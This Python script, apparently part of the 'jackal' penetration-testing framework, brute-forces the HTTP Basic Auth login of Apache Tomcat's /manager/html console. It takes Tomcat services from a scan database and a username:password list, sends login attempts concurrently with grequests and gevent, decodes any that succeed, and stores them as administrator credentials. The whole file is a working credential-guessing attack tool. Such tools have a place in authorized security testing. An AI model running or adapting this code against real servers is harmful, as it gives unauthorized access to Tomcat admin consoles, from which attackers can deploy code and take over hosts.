#!/usr/bin/env python3
import base64
import sys

import gevent
import grequests
from jackal import Credential, Logger, ServiceSearch
from jackal.utils import print_error, print_notification, print_success


def brutefore_passwords(ip, url, credentials, service):
    """
        Bruteforce function, will try all the credentials at the same time, splits the given credentials at a ':'.
    """
    auth_requests = []
    for credential in credentials:
        split = credential.strip().split(':')
        username = split[0]
        password = ''
        if len(split) > 1:
            password = split[1]
        auth_requests.append(grequests.get(url, auth=(username, password)))
    results = grequests.map(auth_requests)
    for result in results:
        if result and result.status_code == 200:
            creds = result.request.headers['Authorization'].split(' ')[1]
            creds = base64.b64decode(creds).decode('utf-8')
            creds = creds.split(':')
            print_success("Found a password for tomcat: {0}:{1} at: {2}".format(
                creds[0], creds[1], url))
            credential = Credential(secret=creds[1], username=creds[0], type='plaintext', access_level='administrator', service_id=service.id, host_ip=ip, description='Tomcat')
            credential.save()


def main():
    """
        Checks the arguments to brutefore and spawns greenlets to perform the bruteforcing.
    """
    services = ServiceSearch()
    argparse = services.argparser
    argparse.add_argument('-f', '--file', type=str, help="File")
    arguments = argparse.parse_args()

    if not arguments.file:
        print_error("Please provide a file with credentials seperated by ':'")
        sys.exit()

    services = services.get_services(search=["Tomcat"], up=True, tags=['!tomcat_brute'])

    credentials = []
    with open(arguments.file, 'r') as f:
        credentials = f.readlines()

    for service in services:
        print_notification("Checking ip:{} port {}".format(service.address, service.port))
        url = 'http://{}:{}/manager/html'
        gevent.spawn(brutefore_passwords, service.address, url.format(service.address, service.port), credentials, service)
        service.add_tag('tomcat_brute')
        service.update(tags=service.tags)

    gevent.wait()
    # TODO fix stats
    Logger().log("tomcat_brute", "Performed tomcat bruteforce scan", {'scanned_services': len(services)})


if __name__ == '__main__':
    main()
